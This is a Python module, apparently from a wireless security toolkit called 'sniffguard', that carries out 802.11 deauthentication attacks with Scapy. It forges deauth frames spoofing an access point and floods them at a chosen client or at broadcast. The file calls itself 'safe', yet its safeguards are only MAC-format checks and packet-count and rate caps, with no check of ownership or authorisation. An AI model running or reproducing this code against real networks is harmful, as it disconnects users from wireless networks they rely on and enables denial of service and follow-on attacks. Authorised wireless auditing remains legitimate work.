# sniffguard/core/deauth_attack.py

import time
import threading
from utils.logger import log

try:
    from scapy.all import (
        sendp, RadioTap, Dot11, Dot11Deauth, 
        get_if_list, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    log.warning("Scapy not available. Deauth attacks will be disabled.")
    SCAPY_AVAILABLE = False

class SafeDeauthAttacker:
    """Safe deauth attacker with built-in safeguards and controls."""
    
    def __init__(self, interface):
        self.interface = interface
        self.is_attacking = False
        self.attack_thread = None
        self.stop_attack = False
        
    def _validate_target(self, target_bssid, client_mac=None):
        """Validate attack target with safety checks."""
        # Basic MAC format validation
        if not target_bssid or len(target_bssid) != 17:
            return False, "Invalid BSSID format"
            
        if client_mac and len(client_mac) != 17:
            return False, "Invalid client MAC format"
            
        # Check for broadcast/multicast addresses that shouldn't be targeted
        bssid_parts = target_bssid.split(':')
        if not all(len(part) == 2 for part in bssid_parts):
            return False, "Malformed BSSID"
            
        # Prevent targeting of certain reserved ranges
        first_octet = int(bssid_parts[0], 16)
        if first_octet & 0x01:  # Multicast bit set
            return False, "Cannot target multicast address"
            
        return True, "Target validated"
        
    def _craft_deauth_packet(self, target_bssid, client_mac=None):
        """Craft deauthentication packet."""
        if not SCAPY_AVAILABLE:
            return None
            
        # Use broadcast if no specific client
        dest_mac = client_mac if client_mac else "ff:ff:ff:ff:ff:ff"
        
        # Craft 802.11 deauth frame
        packet = (
            RadioTap() /
            Dot11(
                type=0,        # Management frame
                subtype=12,    # Deauthentication
                addr1=dest_mac,      # Destination (client or broadcast)
                addr2=target_bssid,  # Source (AP)
                addr3=target_bssid   # BSSID
            ) /
            Dot11Deauth(reason=7)  # Reason: Class 3 frame received from non-associated STA
        )
        
        return packet
        
    def _attack_worker(self, target_bssid, client_mac, packet_count, interval):
        """Worker thread for deauth attack."""
        log.info(f"Starting deauth attack: BSSID={target_bssid}, Client={client_mac or 'broadcast'}, Count={packet_count}")
        
        packet = self._craft_deauth_packet(target_bssid, client_mac)
        if not packet:
            log.error("Failed to craft deauth packet")
            return
            
        sent_count = 0
        try:
            for i in range(packet_count):
                if self.stop_attack:
                    break
                    
                sendp(packet, iface=self.interface, verbose=False)
                sent_count += 1
                
                if interval > 0:
                    time.sleep(interval)
                    
        except Exception as e:
            log.error(f"Deauth attack failed: {e}")
        finally:
            self.is_attacking = False
            log.info(f"Deauth attack completed. Sent {sent_count}/{packet_count} packets.")
            
    def launch_attack(self, target_bssid, client_mac=None, packet_count=50, interval=0.1):
        """Launch controlled deauth attack with safeguards."""
        if not SCAPY_AVAILABLE:
            return False, "Scapy not available for packet crafting"
            
        if self.is_attacking:
            return False, "Attack already in progress"
            
        # Validate target
        valid, message = self._validate_target(target_bssid, client_mac)
        if not valid:
            return False, f"Target validation failed: {message}"
            
        # Safety limits
        packet_count = min(packet_count, 500)  # Max 500 packets
        interval = max(interval, 0.01)         # Min 10ms interval
        
        # Log the attack for audit trail
        log.warning(f"DEAUTH ATTACK INITIATED: Target={target_bssid}, Client={client_mac}, Count={packet_count}")
        
        self.is_attacking = True
        self.stop_attack = False
        
        # Start attack in separate thread
        self.attack_thread = threading.Thread(
            target=self._attack_worker,
            args=(target_bssid, client_mac, packet_count, interval),
            daemon=True
        )
        self.attack_thread.start()
        
        return True, "Deauth attack started"
        
    def stop_current_attack(self):
        """Stop current attack immediately."""
        if self.is_attacking:
            self.stop_attack = True
            log.info("Stopping deauth attack...")
            if self.attack_thread and self.attack_thread.is_alive():
                self.attack_thread.join(timeout=2)
            return True
        return False

# Global attacker instance
_attacker = None

def get_attacker(interface):
    """Get or create attacker instance for interface."""
    global _attacker
    if _attacker is None or _attacker.interface != interface:
        _attacker = SafeDeauthAttacker(interface)
    return _attacker

def launch_deauth_attack(interface, target_bssid, client_mac=None, packet_count=50):
    """Launch safe deauth attack with built-in safeguards."""
    attacker = get_attacker(interface)
    return attacker.launch_attack(target_bssid, client_mac, packet_count)
    
def stop_deauth_attack(interface):
    """Stop current deauth attack."""
    attacker = get_attacker(interface)
    return attacker.stop_current_attack()
    
def is_attack_running(interface):
    """Check if attack is currently running."""
    attacker = get_attacker(interface)
    return attacker.is_attacking
